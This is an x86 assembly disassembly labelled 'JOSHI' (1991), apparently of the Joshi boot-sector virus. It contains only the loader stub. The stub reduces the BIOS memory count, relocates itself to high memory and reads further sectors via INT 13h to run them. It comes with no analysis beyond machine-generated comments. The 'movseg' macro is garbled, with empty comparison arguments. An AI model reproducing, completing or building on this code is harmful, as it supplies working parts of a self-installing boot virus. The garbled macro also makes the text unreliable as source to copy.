PAGE  59,132
  
;==========================================================================
;==                                      ==
;==                 JOSHI                        ==
;==                                      ==
;==      Created:   20-May-91                            ==
;==      Version:                                ==
;==      Passes:    5          Analysis Options on: ABFOPU           ==
;==                                      ==
;==                                      ==
;==========================================================================
  
movseg       macro reg16, unused, Imm16     ; Fixup for Assembler
         ifidn  , 
         db 0BBh
         endif
         ifidn  , 
         db 0B9h
         endif
         ifidn  , 
         db 0BAh
         endif
         ifidn  , 
         db 0BEh
         endif
         ifidn  , 
         db 0BFh
         endif
         ifidn  , 
         db 0BDh
         endif
         ifidn  , 
         db 0BCh
         endif
         ifidn  , 
         db 0BBH
         endif
         ifidn  , 
         db 0B9H
         endif
         ifidn  , 
         db 0BAH
         endif
         ifidn  , 
         db 0BEH
         endif
         ifidn  , 
         db 0BFH
         endif
         ifidn  , 
         db 0BDH
         endif
         ifidn  , 
         db 0BCH
         endif
         dw seg Imm16
endm
DATA_6E     EQU 7C1EH           ; (97E4:7C1E=0)
DATA_7E     EQU 7C1FH           ; (97E4:7C1F=0)
DATA_8E     EQU 7C20H           ; (97E4:7C20=0)
  
SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A
  
  
        ORG 100h
  
JOSHI       PROC    FAR
  
START:
        JMP SHORT LOC_1     ; (0121)
        NOP
        PUSH    AX
        INC BX
        INC DX
        DB   61H, 63H, 6BH, 75H, 70H, 00H
        DB   02H, 01H, 01H, 00H, 02H,0E0H
        DB   00H, 60H, 09H,0F9H, 07H, 00H
        DB   0FH, 00H, 02H, 00H, 00H, 00H
        DB   50H, 01H, 00H
LOC_1:
        CLI             ; Disable interrupts
        MOV AX,CS
        MOV DS,AX
        MOV SS,AX
        MOV SP,0F000H
        STI             ; Enable interrupts
        MOV AX,DATA_5       ; (97E4:0413=0)
        MOV CL,6
        SHL AX,CL           ; Shift w/zeros fill
        MOV ES,AX
        MOV AX,200H
        SUB AX,21H
        MOV DI,0
        MOV SI,7C00H
        ADD SI,AX
        ADD DI,AX
        MOV CX,179H
        SUB CX,AX
        CLD             ; Clear direction
        REPE    CMPSB           ; Rep zf=1+cx >0 Cmp [si] to es:[di]
        JNZ LOC_2           ; Jump if not zero
        MOV AX,ES
        ADD AX,20H
        MOV ES,AX
        MOV BX,0
        PUSH    ES
        PUSH    BX
        MOV AX,1
        RETF                ; Return far
LOC_2:
        MOV AX,DATA_5       ; (97E4:0413=0)
        SUB AX,6
        MOV DATA_5,AX       ; (97E4:0413=0)
        MOV CL,6
        SHL AX,CL           ; Shift w/zeros fill
        MOV ES,AX
        MOV SI,7C00H
        MOV DI,0
        MOV CX,200H
        CLD             ; Clear direction
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AX,ES
        ADD AX,20H
        MOV ES,AX
        MOV BX,0
        PUSH    ES
        PUSH    BX
        PUSH    CS
        POP DS
        MOV AH,2
        MOV AL,1
        MOV CH,DS:DATA_6E       ; (97E4:7C1E=0)
        MOV CL,DS:DATA_7E       ; (97E4:7C1F=0)
        MOV DH,0
        MOV DL,DS:DATA_8E       ; (97E4:7C20=0)
        PUSH    AX
        MOV AX,0B800H
        MOV DS,AX
        POP AX
LOC_3:
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    ES
        INT 13H         ; Disk  dl=drive a  ah=func 02h
                        ;  read sectors to memory es:bx
        POP ES
        POP DX
        POP CX
        POP BX
        POP AX
        JNC LOC_4           ; Jump if carry=0
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    ES
        MOV AH,0
        INT 13H         ; Disk  dl=drive a  ah=func 00h
                        ;  reset disk, al=return status
        POP ES
        POP DX
        POP CX
        POP BX
        POP AX
        JMP SHORT LOC_3     ; (01A1)
LOC_4:
        INC CL
        ADD BX,200H
        PUSH    DS
        PUSH    CS
        POP DS
        PUSH    AX
        MOV AL,CL
        SUB AL,DS:DATA_7E       ; (97E4:7C1F=0)
        SUB AL,8
        POP AX
        POP DS
        JC  LOC_3           ; Jump if carry Set
        MOV AX,0
        RETF                ; Return far
        DB  160 DUP (0)
        DB   5AH, 5AH, 5AH, 5AH,0C8H, 14H
        DB  0A2H, 8CH, 01H, 00H, 0FH, 00H
        DB   01H, 00H, 5CH, 00H
        DB  87 DUP (0)
        DB   02H, 02H, 02H, 50H, 0FH, 0FH
        DB   01H, 46H, 00H, 01H, 00H, 02H
        DB   01H, 02H, 01H, 00H, 00H
        DB  46H
        DB  14 DUP (0)
        DB  0F9H,0FFH,0FFH, 00H
        DB  271 DUP (0)
DATA_5      DW  0
        DB  235 DUP (0)
  
JOSHI       ENDP
  
SEG_A       ENDS
  
  
  
        END START
        